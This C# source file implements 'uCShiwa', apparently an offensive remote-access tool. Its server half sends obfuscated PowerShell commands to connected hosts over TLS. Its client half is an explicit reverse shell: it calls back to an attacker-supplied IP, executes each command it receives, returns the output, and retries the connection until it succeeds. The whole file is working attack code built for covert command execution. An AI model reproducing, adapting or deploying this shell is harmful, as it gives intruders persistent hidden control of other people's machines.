using System;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.IO;
using System.Management.Automation;
using System.Collections.ObjectModel;
using System.Threading;
using System.Text.RegularExpressions;

namespace uCShiwa
{
    class Program
    {
        static int Main(string[] args)
        {            
            //----------SERVER MODE----------//
            if (args.Length == 3)
            {
                Int16 port = Int16.Parse(args[0]);
                var certificate = new X509Certificate2(args[1], args[2]);
                Console.WriteLine("<0> Server mode\n<0> Port: {0:D}", port);

                //Start Tcp Listener, wait for client and get SSL stream
                var listener = new TcpListener(IPAddress.Any, port);
                listener.Start();

                while (true)
                {
                    var client = listener.AcceptTcpClient();
                    var stream = client.GetStream();
                    SslStream sslStream = new SslStream(stream, false);
                    sslStream.AuthenticateAsServer(certificate, false, System.Security.Authentication.SslProtocols.Tls12, false);
                    
                    UServer.printConnection(sslStream);

                    string message;

                    //cmd conf
                    bool backgroundMode = false; // close connection without read response


                    while (client.Connected)
                    {
                        UServer.ULog(client.Client.RemoteEndPoint.ToString());
                        Console.Write("<0> {0}>", client.Client.RemoteEndPoint);

                        message = Console.ReadLine();
                        //message = File.ReadAllText("CommandeOneline.txt");

                        UServer.ULog(message);

                        //specific commands
                        if ("exit" == message)
                        {
                            client.Close();
                            Console.WriteLine("exit cmd: connexion closed");
                        }
                        else if ("bg" == message)
                        {
                            backgroundMode = !backgroundMode;
                            Console.WriteLine("backgroude mode: {0}", backgroundMode);
                        }
                        //not a specific message
                        else
                        {
                            message += " |Out-String";
                            message = UServer.ObfuscatePwsh(message);

                            if (backgroundMode)
                            {
                                Common.sendMsg(message, sslStream);
                                client.Close();
                                Console.WriteLine("bg mode: connexion closed");
                            }
                            else
                            {
                                Common.sendMsg(message, sslStream);
                                message = Common.readMsg(sslStream, client);
                                Console.WriteLine(message);
                                UServer.ULog(message);
                            }
                        }

                    }
                }

            }

            //----------CLIENT MODE----------//
            else if (args.Length == 2)
            {

                String ip = args[0];
                Int16 port = Int16.Parse(args[1]);
                string message;
                Console.WriteLine("<0> Reverse Shell mode\n<0> Ip: {0}\n<0> Port: {1:D}", ip, port);
                while (true)
                {
                    try
                    {
                        //Create tcp client, wrap in SSL and validate certificate
                        TcpClient client = new TcpClient(ip, port);
                        var stream = client.GetStream();
                        SslStream sslStream = new SslStream(stream, false, new RemoteCertificateValidationCallback(UClient.CertificateValidationCallback));
                        sslStream.AuthenticateAsClient("client", null, System.Security.Authentication.SslProtocols.Tls12, false);


                        while (true)
                        {
                            message = Common.readMsg(sslStream, client);
                            if (message != String.Empty || message != "(Empty)")
                            {
                                message = UClient.executePwsh(message);
                            }
                            Common.sendMsg(message, sslStream);
                        }
                    }
                    catch(Exception e)
                    {
                        Console.WriteLine("{0} Exception caught.", e);
                        Thread.Sleep(3000);
                        Console.WriteLine("<0> Retry:\nReverse Shell mode\n<0> Ip: {0}\n<0> Port: {1:D}", ip, port);
                    }
                    
                }

            }

            //---------HELP---------//
            else 
            {
                Common.printHelp();
                return 1;
            }
        }       
        
    }
}